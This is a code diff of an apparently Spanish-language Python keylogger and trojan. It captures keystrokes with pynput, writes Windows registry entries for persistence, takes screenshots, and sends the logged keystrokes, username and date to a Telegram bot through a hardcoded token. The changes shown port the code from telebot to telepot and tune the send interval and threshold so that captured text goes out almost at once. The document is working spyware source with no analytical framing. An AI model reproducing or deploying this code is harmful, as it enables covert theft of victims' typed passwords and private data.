@@ -18,13 +18,10 @@ from pynput.keyboard import Listener
 from getpass import getuser     # Obtiene el nombre del usuario
 from datetime import datetime   # Devuelve fecha y hora actual
 from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
-
-
-
 import datetime                 # Devuelve fecha y hora actual
 import random                   # Genera numeros
 import os                       # Lib para copiar archivos
-import telebot                  # Telegram API
+import telepot                  # Telegram API
 import yagmail                  # Enviar archivos solo a Gmail
 import pymysql                  # Lib connection mysql
 import shutil                   # Lib para crear carpetas
@@ -44,7 +41,7 @@ class Config:
         self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY         # <No cambiar>
         self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME       # <No cambiar>
         # Importante
-        self.TIMESEND = 8 #[minutos]                                               # Tiempo de envió del registro
+        self.TIMESEND = 1 #[minutos]                                               # Tiempo de envió del registro
         self.MODE = 2      # 0 = Gmail
                            # 1 = DataBase                                           # Solo se puede usar una opción
                            # 2 = TelegramBot
@@ -74,7 +71,7 @@ class Config:
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
             # Personalize
-            self.LEN_TEXT = 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+            self.LEN_TEXT = 2#3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 
 class Functions:
@@ -201,7 +198,9 @@ class Util:
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
     def ScreenShot(self):
-        """
+        """        bot = telepot.Bot(Config.TelegramBot().TOKEN)
+        #bot.message_loop(handle)
+        bot.sendChatAction(Config.TelegramBot().ID, 'typing')
         bot.sendChatAction(chat_id, 'typing')
         screenshot = ImageGrab.grab()
         screenshot.save('screenshot.jpg')
@@ -240,8 +239,8 @@ class Util:
             f = open(pathN, 'r')
             def SendT(ID):
                 try:
-                    bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                    bot.send_message(ID, "User: " + str(getuser()) + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
+                    bot = telepot.Bot(Config.TelegramBot().TOKEN)  # Token
+                    bot.sendMessage(Config.TelegramBot().ID, "User: " + str(getuser()) + "\nDate: " + Functions().CurrentTime() + "\n\r\n\r\n\r\n" + f.read())
                     print("[TelegramBot] se envió a Telegram [ID] = " + str(ID))
                 except:
                     print("[TelegramBot] no se pudo enviar el archivo [ID] = " + str(ID))
@@ -255,7 +254,6 @@ class Util:
 
             if Config.TelegramBot().ID_3 != 000000000:
                 SendT(Config.TelegramBot().ID_3)
-
             f.close()
             os.remove(pathN)
             print("[TelegramBot] Se eliminó el archivo caché correctamente")
@@ -536,6 +534,4 @@ if __name__ == '__main__':
     p2.start()
     p1.start()
     p1.join()
-
-    #id = [654654,65654,6565874]
 
